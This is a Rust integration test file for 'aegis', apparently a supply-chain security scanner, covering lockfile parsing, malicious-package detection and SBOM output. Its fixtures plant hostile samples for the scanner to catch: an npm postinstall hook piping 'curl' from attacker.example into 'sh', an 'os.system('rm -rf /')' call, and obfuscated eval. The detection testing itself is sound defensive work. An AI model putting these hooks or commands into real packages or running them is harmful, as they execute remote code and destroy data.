//! Integration tests that drive the real `aegis` binary end-to-end.
//! Network-free: only `parse`, `analyze`, and `run` with source-scan
//! checks (ast/heuristics) — no OSV lookup — so they're deterministic
//! and run offline in CI.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

const BIN: &str = env!("CARGO_BIN_EXE_aegis");

/// Unique temp dir per test (no rand/time dep).
fn tmp(tag: &str) -> PathBuf {
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let d = std::env::temp_dir().join(format!(
        "aegis-cli-it-{tag}-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn write(dir: &Path, name: &str, body: &str) {
    std::fs::write(dir.join(name), body).unwrap();
}

struct Out {
    code: i32,
    stdout: String,
}

fn run(args: &[&str]) -> Out {
    let o = Command::new(BIN).args(args).output().unwrap();
    Out {
        code: o.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&o.stdout).into_owned(),
    }
}

#[test]
fn parse_lockfile_json() {
    let d = tmp("parse");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "parse",
        d.join("package-lock.json").to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"name\": \"lodash\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("\"version\": \"4.17.21\""));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn parse_unknown_file_exits_2() {
    let out = run(&["parse", "/nonexistent/nope.lock"]);
    assert_eq!(out.code, 2);
}

#[test]
fn analyze_malicious_js_blocks() {
    let d = tmp("analyze");
    write(
        &d,
        "index.js",
        "const cp = require('child_process');\neval(atob('ZXZpbA=='));\n",
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"block\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("shell-spawn"));
    assert!(out.stdout.contains("dynamic-eval"));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_npm_manifest_metadata_heuristics_fire() {
    // The metadata detectors (install-hook, optional-git-dep, vcs-dep) read the
    // package.json the analyze pipeline now parses — not source files. A clean
    // index.js next to a malicious manifest must still BLOCK.
    let d = tmp("manifest");
    write(&d, "index.js", "module.exports = 1;\n");
    write(
        &d,
        "package.json",
        r#"{
          "name": "evilpkg",
          "version": "1.0.0",
          "scripts": { "postinstall": "curl -sSL http://attacker.example/p | sh" },
          "optionalDependencies": { "x": "github:evil/x#aabbcc1122334455667788990011223344556677" }
        }"#,
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"block\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("install-hook-suspicious"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("git-dep-in-optional"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_unlisted_large_file_flagged() {
    // A large undeclared JS file (not in package.json "files") is a smuggled
    // payload shape — exercises the manifest `files` allowlist parsing.
    let d = tmp("unlisted");
    write(
        &d,
        "package.json",
        r#"{"name":"big","version":"1.0.0","files":["dist"]}"#,
    );
    std::fs::write(d.join("payload.js"), "a".repeat(600_000)).unwrap();
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.contains("unlisted-large-file"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_clean_npm_package_is_safe() {
    // A legit manifest (node-gyp rebuild hook, registry dep) must NOT trip the
    // metadata detectors — guards against false positives from the wiring.
    let d = tmp("cleannpm");
    write(&d, "index.js", "module.exports = 1;\n");
    write(
        &d,
        "package.json",
        r#"{"name":"clean","version":"1.0.0","scripts":{"postinstall":"node-gyp rebuild"},"dependencies":{"lodash":"^4.17.21"}}"#,
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"safe\""),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_clean_code_is_safe() {
    let d = tmp("clean");
    write(&d, "index.js", "export const add = (a, b) => a + b;\n");
    let out = run(&["analyze", d.to_str().unwrap(), "--json"]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"safe\""),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn run_config_parallel_source_tasks_fail_on_block() {
    let d = tmp("run");
    // two malicious package dirs + one clean, all scanned via source checks only.
    std::fs::create_dir_all(d.join("evil1")).unwrap();
    std::fs::create_dir_all(d.join("evil2")).unwrap();
    std::fs::create_dir_all(d.join("good")).unwrap();
    write(&d.join("evil1"), "a.js", "eval(atob('eA=='))");
    write(&d.join("evil2"), "b.py", "import os\nos.system('rm -rf /')");
    write(&d.join("good"), "c.js", "export const x = 1;");

    let cfg = format!(
        r#"
[[task]]
name = "evil1"
path = "{p}/evil1"
ecosystem = "npm"
checks = ["ast", "heuristics"]

[[task]]
name = "evil2"
path = "{p}/evil2"
ecosystem = "pypi"
checks = ["ast", "heuristics"]

[[task]]
name = "good"
path = "{p}/good"
ecosystem = "npm"
checks = ["ast", "heuristics"]
"#,
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);

    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    // Any BLOCK task → overall fail → exit 1.
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(out.stdout.contains("\"failed\": true"), "{}", out.stdout);
    // The clean task should not fail.
    assert!(out.stdout.contains("\"name\": \"good\""));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_emits_cyclonedx_from_lockfile() {
    let d = tmp("sbom");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--project",
        "myapp",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"bomFormat\": \"CycloneDX\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("\"specVersion\": \"1.5\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("pkg:npm/lodash@4.17.21"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("aegis:root:myapp"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_spdx_format() {
    let d = tmp("spdx");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--format",
        "spdx",
        "--project",
        "myapp",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"spdxVersion\": \"SPDX-2.3\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("pkg:npm/lodash@4.17.21"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_unknown_format_exits_2() {
    let d = tmp("badfmt");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--format",
        "bogus",
    ]);
    assert_eq!(out.code, 2);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_unknown_lockfile_exits_2() {
    let out = run(&["sbom", "/nonexistent/nope.lock"]);
    assert_eq!(out.code, 2);
}

#[test]
fn run_missing_config_exits_2() {
    let out = run(&["run", "/nonexistent/aegis.toml"]);
    assert_eq!(out.code, 2);
}
